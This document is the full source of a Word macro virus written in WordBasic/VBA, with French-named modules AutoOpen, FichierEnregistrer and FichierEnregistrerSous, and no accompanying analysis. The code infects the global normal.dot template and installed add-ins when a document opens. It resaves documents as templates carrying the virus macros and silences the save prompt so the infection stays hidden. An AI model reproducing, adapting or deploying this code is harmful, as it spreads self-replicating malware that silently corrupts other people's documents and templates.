   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FichierEnregistrerSous"

   Public Sub MAIN()
   Dim l$
   Dim v$
   Dim m1$
   Dim m2$
   Dim m3$
   Dim m$
   Dim d$
   Dim save_is_ok
   Dim dlg As Object
   Dim old$
   Dim old_window$
   Dim new_window$
   '**********************************
   ' Warning, don't change anything.
   '**********************************
   On Error GoTo -1: On Error GoTo EndFichierEnregistrerSous
   l$ = WordBasic.[AppInfo$](16)
   v$ = WordBasic.[AppInfo$](2)
   If l$ <> "Français" Or WordBasic.Val(v$) < 6 Then GoTo EndFichierEnregistrerSous
   m1$ = "AutoOpen"
   m2$ = "FichierEnregistrer"
   m3$ = "FichierEnregistrerSous"
   m$ = WordBasic.[MacroFileName$](m3$)
   d$ = WordBasic.[SelectionFileName$]()
   save_is_ok = 0
   'If file is infected and not .dot
   If (m$ = d$) And (UCase(WordBasic.[Right$](m$, 3)) <> "DOT") Then
     Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
     WordBasic.CurValues.DocumentStatistics dlg
     old$ = dlg.Template
     old_window$ = WordBasic.[WindowName$]()
     WordBasic.FileNew Template:=d$, NewTemplate:=0
     new_window$ = WordBasic.[WindowName$]()
     save_is_ok = 1

   'FenDocDéplacement 6, 22
   'FenDocDimension 753, 459

     WordBasic.FileTemplates Template:=old$
     WordBasic.ToolsMacro Name:=m3$, Show:=2, Run:=1
     'Close old_window$ without saving
     WordBasic.Activate old_window$
     WordBasic.FileClose 2
     save_is_ok = 2
   Else
     WordBasic.ToolsMacro Name:=m3$, Show:=2, Run:=1
   End If
   EndFichierEnregistrerSous:
   If save_is_ok = 1 Then
     WordBasic.Activate new_window$
     WordBasic.FileClose 2
   End If
   Err.Number = 0
   On Error GoTo -1: On Error GoTo 0
   End Sub

   Attribute VB_Name = "FichierEnregistrer"

   Public Sub MAIN()
   Dim debug_
   Dim l$
   Dim v$
   Dim m1$
   Dim m2$
   Dim m3$
   Dim d$
   Dim m$
   '**********************************
   ' Warning, don't change anything.
   '**********************************
   On Error GoTo -1: On Error GoTo EndFichierEnregistrer
   'Debug=0 Oui, Debug=1 Non
   debug_ = 0
   l$ = WordBasic.[AppInfo$](16)
   v$ = WordBasic.[AppInfo$](2)
   If l$ <> "Français" Or WordBasic.Val(v$) < 6 Then GoTo EndFichierEnregistrer
   m1$ = "AutoOpen"
   m2$ = "FichierEnregistrer"
   m3$ = "FichierEnregistrerSous"
   'Save files with a name
   d$ = WordBasic.[SelectionFileName$]()
   If (WordBasic.[Right$](d$, 1) = "\") And (WordBasic.IsMacro() = 0) Then
     WordBasic.ToolsMacro Name:=m2$, Show:=2, Run:=1
     d$ = WordBasic.[SelectionFileName$]()
   End If
   'Infect file
   m$ = WordBasic.[MacroFileName$](m2$)
   If (m$ <> d$) And (WordBasic.IsMacro() = 0) Then
     'Save file d$ as template (.Format=1)
     WordBasic.FileSaveAs Format:=1, AddToMru:=0
     'Copy macros
     WordBasic.MacroCopy m$ + ":" + m1$, d$ + ":" + m1$, debug_
     WordBasic.MacroCopy m$ + ":" + m2$, d$ + ":" + m2$, debug_
     WordBasic.MacroCopy m$ + ":" + m3$, d$ + ":" + m3$, debug_
   End If
   'Save the file d$ with its new macros
   WordBasic.FileSave
   EndFichierEnregistrer:
   Err.Number = 0
   On Error GoTo -1: On Error GoTo 0
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim debug_
   Dim l$
   Dim v$
   Dim m1$
   Dim m2$
   Dim m3$
   Dim m$
   Dim i
   Dim d$
   Dim DotPath$
   '**********************************
   ' Warning, don't change anything.
   '**********************************
   On Error Resume Next
   'Debug=0 Oui, Debug=1 Non
   debug_ = 0
   l$ = WordBasic.[AppInfo$](16)
   v$ = WordBasic.[AppInfo$](2)
   If l$ <> "Français" Or WordBasic.Val(v$) < 6 Then GoTo EndAutoOpen
   m1$ = "AutoOpen"
   m2$ = "FichierEnregistrer"
   m3$ = "FichierEnregistrerSous"
   WordBasic.DisableAutoMacros 1
   m$ = WordBasic.[MacroFileName$](m1$)
   For i = 1 To WordBasic.CountAddIns()
     d$ = WordBasic.[GetAddInName$](i)
     'Copy macros
   If MacroExist(m1$, d$) = 0 And MacroExist(m2$, d$) = 0 And MacroExist(m3$, d$) = 0 Then
       WordBasic.MacroCopy m$ + ":" + m1$, d$ + ":" + m1$, debug_
       WordBasic.MacroCopy m$ + ":" + m2$, d$ + ":" + m2$, debug_
       WordBasic.MacroCopy m$ + ":" + m3$, d$ + ":" + m3$, debug_
     End If
   Next
   DotPath$ = WordBasic.[DefaultDir$](3)
   If DotPath$ = "" Then DotPath$ = WordBasic.[DefaultDir$](2)
   If WordBasic.[Right$](DotPath$, 1) <> "\" Then DotPath$ = DotPath$ + "\"
   d$ = WordBasic.[Files$](DotPath$ + "normal.dot")
   If (d$ <> "") Then
     'Copy macros
     If MacroExist(m1$, d$) = 0 And MacroExist(m2$, d$) = 0 And MacroExist(m3$, d$) = 0 Then
       WordBasic.MacroCopy m$ + ":" + m1$, d$ + ":" + m1$, debug_
       WordBasic.MacroCopy m$ + ":" + m2$, d$ + ":" + m2$, debug_
       WordBasic.MacroCopy m$ + ":" + m3$, d$ + ":" + m3$, debug_
     End If
   End If
   'Saving Normal.dot won't be seen
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.DisableAutoMacros 0
   EndAutoOpen:
   Err.Number = 0
   On Error GoTo -1: On Error GoTo 0
   End Sub

   Private Function MacroExist(a$, b$)
   Dim i
   On Error GoTo -1: On Error GoTo notfound
   i = WordBasic.IsExecuteOnly(b$ + ":" + a$)
   MacroExist = -1
   'MsgBox b$ + ":" + a$ + " existe"
   GoTo suite
   notfound:
   Err.Number = 0
   MacroExist = 0
   'MsgBox b$ + ":" + a$ + " inexistante"
   suite:
   On Error Resume Next
   End Function
